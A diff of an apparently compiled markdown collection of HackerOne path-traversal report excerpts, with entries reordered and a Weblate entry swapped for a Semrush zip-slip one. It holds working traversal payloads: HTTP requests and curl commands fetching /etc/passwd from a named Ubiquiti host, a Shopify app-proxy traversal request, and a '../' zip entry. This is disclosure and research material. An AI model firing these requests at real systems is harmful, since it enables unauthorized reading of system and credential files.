@@ -952,29 +952,6 @@ async def report_weakness_id(request: ReportWeaknessIdModelRequest):
     
 ```
 
-## #260420 [dev-nightly.ubnt.com] Local File Reading — ui — - — Path Traversal
-Source: `hackerone/reports/2017/260420.md` (https://hackerone.com/reports/260420)
-
-```
-GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
-Host: dev-nightly.ubnt.com
-```
-
-```
-curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
-```
-
-```
-GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
-Host: dev-nightly.ubnt.com
-'''
-'''
-curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
-'''
-
-**Result**
-```
-
 ## #850775 Windows only: arbitrary file read vulnerability in openssl s_server — ibb — - — Path Traversal
 Source: `hackerone/reports/2020/850775.md` (https://hackerone.com/reports/850775)
 
@@ -1029,6 +1006,29 @@ index 038046808037..5f58ef68fefa 100644
                      dot = (e[0] == '.') ? 2 : 0;
 ```
 
+## #260420 [dev-nightly.ubnt.com] Local File Reading — ui — - — Path Traversal
+Source: `hackerone/reports/2017/260420.md` (https://hackerone.com/reports/260420)
+
+```
+GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
+Host: dev-nightly.ubnt.com
+```
+
+```
+curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
+```
+
+```
+GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
+Host: dev-nightly.ubnt.com
+'''
+'''
+curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
+'''
+
+**Result**
+```
+
 ## #3553340 Active Storage Vips Transformer Missing validate_transformation — CVE-2025-24293 Incomplete Fix — rails — - — Path Traversal
 Source: `hackerone/reports/2026/3553340.md` (https://hackerone.com/reports/3553340)
 
@@ -1065,6 +1065,28 @@ RUN gem install image_processing ruby-vips
 WORKDIR /app
 COPY poc.rb .
 CMD ["ruby", "poc.rb"]
+```
+
+## #869888 Path Traversal in App Proxy — shopify — - — Path Traversal
+Source: `hackerone/reports/2020/869888.md` (https://hackerone.com/reports/869888)
+
+```
+GET /apps/ss/b.php/../../?shop=a&Shop=asd HTTP/1.1
+Host: ███████
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+```
+
+```
+	<head>
+<meta name=dropbox-domain-verification content=4yyz8tdqnx1e />
+</head>
+
+
+<body>hi</body>
 ```
 
 ## #3678395 Path Traversal in mbstream Extract — mariadb — - — Path Traversal
@@ -1134,28 +1156,6 @@ with open(sys.argv[3], 'wb') as f:
 print('wrote', sys.argv[3])
 ```
 
-## #869888 Path Traversal in App Proxy — shopify — - — Path Traversal
-Source: `hackerone/reports/2020/869888.md` (https://hackerone.com/reports/869888)
-
-```
-GET /apps/ss/b.php/../../?shop=a&Shop=asd HTTP/1.1
-Host: ███████
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Upgrade-Insecure-Requests: 1
-```
-
-```
-	<head>
-<meta name=dropbox-domain-verification content=4yyz8tdqnx1e />
-</head>
-
-
-<body>hi</body>
-```
-
 ## #3408126 Directory Traversal Vulnerability in cURL via Content-Disposition Header Processing — curl — - — Path Traversal
 Source: `hackerone/reports/2025/3408126.md` (https://hackerone.com/reports/3408126)
 
@@ -1193,21 +1193,26 @@ Grafana config file
 3. File Read server  /etc/resolv.conf  :
 ```
 
-## #4037976 Incomplete VCS metadata exclusion: `.svn` / `.bzr` bypass CVE-2026-61792 due to missing `VCS_METADATA_DIRS` entries. — weblate — - — Path Traversal
-Source: `hackerone/reports/2026/4037976.md` (https://hackerone.com/reports/4037976)
+## #316713 Ad Builder Display Ads Path Traversal — semrush — - — Path Traversal
+Source: `hackerone/reports/2020/316713.md` (https://hackerone.com/reports/316713)
 
 ```
-VCS_METADATA_DIRS = frozenset((".git", ".hg"))
-```
-
-```
-git clone https://github.com/WeblateOrg/weblate.git
-grep -n "VCS_METADATA_DIRS" weblate/utils/files.py
-# 36: VCS_METADATA_DIRS = frozenset((".git", ".hg"))
+Zip file path    Extracted file path
+data.csv      => /██████/█████/ab_███████_1246354_displayAds.tmp.unpack/data.csv
+words.csv     => /████████/████/ab_███_1246354_displayAds.tmp.unpack/words.csv
+../1.png      => /█████████/███/1.png
 ```
 
 ```
-sed -n '105,115p' weblate/trans/component_copy.py
-# 109: ignore_vcs_metadata = shutil.ignore_patterns(".git", ".hg", ".svn", ".bzr")
+{"jsonrpc":"2.0","id":"1c46d1ff-7327-4be2-8b8f-69c1906fb71c","error":{"code":-32603,"message":"mkdir /███████/█████/ab_███_1246354_displayAds.tmp.unpack/link: not a directory"}}
+```
+
+```
+$ zipinfo display-ads-deb.zip
+Archive:  display-ads-deb.zip
+Zip file size: 581 bytes, number of entries: 2
+-rw-r--r--  3.0 unx      432 tx defN 18-Feb-16 07:35 data.csv
+-rw-r--r--  3.0 unx       48 tx stor 18-Feb-15 18:28 words.csv
+2 files, 480 bytes uncompressed, 269 bytes compressed:  44.0%
 ```
 
